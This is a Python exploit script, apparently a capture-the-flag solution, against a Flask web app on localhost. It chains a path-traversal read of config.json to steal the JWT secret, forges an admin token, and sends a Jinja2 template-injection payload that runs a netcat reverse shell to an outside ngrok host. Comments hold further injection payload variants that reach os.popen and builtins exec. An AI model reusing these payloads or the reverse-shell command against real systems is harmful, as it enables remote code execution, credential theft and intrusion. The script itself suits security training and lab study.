import httpx
import jwt
import datetime

URL = "http://127.0.0.1:5000"
CMD = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.ap.ngrok.io 19542 >/tmp/f"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
    def get_secret(self):
        r = self.c.get('/download', params={
            'filename':'../../config.json',
            'dummy':'random.jpg'
        })
        print(r.text)
        self.secret_key = r.json()['secret_key']
        self.create_jwt()
        
    def create_jwt(self):
        if self.secret_key:
            self.jwt_token = jwt.encode({'username': '{{1+1}}', 'exp': datetime.datetime.now() + datetime.timedelta(minutes=30)}, self.secret_key, algorithm='HS256')
            self.c.cookies = {'jwt_token': self.jwt_token.decode()}
        else:
            print('secret key not sett')    
    
    def trigger_ssti(self):
       print(self.jwt_token)
       r = self.c.get('/admin')
       if r.status_code == 200:
        #    for i in range(500):
        #    http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params
        #  {{ lipsum|attr(request.form.g)|attr(request.form.b)|attr("exec")(request.form.c) }}
        # i = 10
            r = self.c.post('/check', data={
                # {{ lipsum.__globals__.os.popen('id') }}
                # {{lipsum.__globals__.__builtins__.exec('/etc/passwd')}}
                # ''.__class__ = ''['__class__']
                # lipsum[request.form.g][request.form.b].exec('ls')
                
                "filename" : """{{ lipsum[request.form.g][request.form.b][request.form.e](request.form.c) }}""",
                # {{ lipsum[request.form.g][request.form.b].exec(request.form.c) }}
                # "filename": """{{''['__class__']['__mro__'][1][request.form.s]( )[request.form.i|int](request.form.p)}}""",
                # "filename": """{{ (lipsum|attr(request.form.c)|attr(request.form.s)|attr(request.form.g)(request.form.i|int)) }}""",
                # "a": "{{1+1}}",
                #    "filename":"""{{ ( )|.__base__|attr(request.form.s)( )|attr(request.form.g)(request.form.i|int)(request.form.p,shell=true) }}""",
                "c":f"import os;os.system('{CMD}')",
                "s":"__subclasses__",
                "g": "__globals__",
                "e": "exec",
                "b": "__builtins__",
                "i":370
                })
            # if 'popen' in r.text.lower():
            #     print(i)
            print(r.text)
            #     break
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    api.get_secret()
    api.trigger_ssti()